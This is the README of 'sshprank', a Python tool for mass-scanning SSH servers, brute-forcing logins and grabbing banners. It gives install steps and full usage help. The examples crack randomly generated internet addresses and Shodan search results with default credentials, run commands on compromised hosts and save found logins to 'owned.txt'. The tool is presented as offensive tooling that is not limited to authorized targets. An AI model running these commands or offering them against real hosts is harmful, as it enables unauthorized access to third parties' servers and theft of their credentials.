# sshprank

## Description

A fast SSH mass-scanner, login cracker and banner grabber tool using the
python-masscan and shodan module.

## Installation

Clone the repository, make sure that you have a Python installation, change
into the `sshprank` directory and install `sshprank`.

```bash
$ git clone git@github.com:noptrix/sshprank.git
$ cd sshprank
$ python3 setup.py install --user
```

## Usage

```bash
[ hacker@blackarch ~ ]$ sshprank -H
              __                           __

usage

  sshprank <mode> [opts] | <misc>

modes

  -h <hosts[:ports]>    - single host or host list to crack. multiple ports
                          can be separated by comma, e.g.: 127.0.0.1:22,222,2022
                          (default port: 22)

  -m <opts> [-r <num>]  - pass arbitrary masscan opts, portscan given hosts and
                          crack for logins. found sshd services will be saved to
                          'sshds.txt' in supported format for '-h' option and
                          even for '-b'. use '-r' for generating random ipv4
                          addresses rather than scanning given hosts. these
                          options are always on: '-sS -oX - --open'.
                          NOTE: if you intent to use the '--banner' option then
                          you need to specify '--source-ip <some_ipaddr>' which
                          is needed by masscan. better check masscan options!

  -s <str;page;lim>     - search ssh servers using shodan and crack logins.
                          see examples below. note: you need a better API key
                          than this one i offer in order to search more than 100
                          (= 1 page) ssh servers. so if you use this one use
                          '1' for 'page'.

  -b <file>             - list of hosts to grab sshd banner from
                          format: <host>[:ports]. multiple ports can be
                          separated by comma (default port: 22)

options

  -r <num>              - generate <num> random ipv4 addresses, check for open
                          sshd port and crack for login (only with -m option!)
  -u <user|file>        - single username or user list (default: root)
  -p <pass|file>        - single password or password list (default: root)
  -c <file>             - list of user:pass combination
  -C <cmd|file>         - read commands from file (line by line) or execute a
                          single command on host if login was cracked
  -N                    - do not output ssh command results
  -x <num>              - num threads for parallel host crack (default: 50)
  -S <num>              - num threads for parallel service crack (default: 20)
  -X <num>              - num threads for parallel login crack (default: 5)
  -B <num>              - num threads for parallel banner grabbing (default: 70)
  -T <sec>              - num sec for auth and connect timeout (default: 5s)
  -R <sec>              - num sec for (banner) read timeout (default: 3s)
  -o <file>             - write found logins to file. format:
                          <host>:<port>:<user>:<pass> (default: owned.txt)
  -e                    - exclude host after first login was found. continue
                          with other hosts instead
  -E                    - exit sshprank completely after first login was found
  -v                    - verbose mode. show found logins, sshds, etc.
                          (default: off)

misc

  -H                    - print help
  -V                    - print version information

examples

  # crack targets from a given list with user admin, pw-list and 20 host-threads
  $ sshprank -h sshds.txt -u admin -P /tmp/passlist.txt -x 20

  # first scan then crack from founds ssh services using 'root:admin'
  $ sudo sshprank -m '-p22,2022 --rate 5000 --source-ip 192.168.13.37 \
    --range 192.168.13.1/24' -p admin

  # generate 1k random ipv4 addresses, then port-scan (tcp/22 here) with 1k p/s
  # and crack logins using 'root:root' on found sshds
  $ sudo sshprank -m '-p22 --rate=1000' -r 1000 -v

  # search 50 ssh servers via shodan and crack logins using 'root:root' against
  # found sshds
  $ sshprank -s 'SSH;1;50'

  # grab banners and output to file with format supported for '-h' option
  $ sshprank -b hosts.txt > sshds2.txt
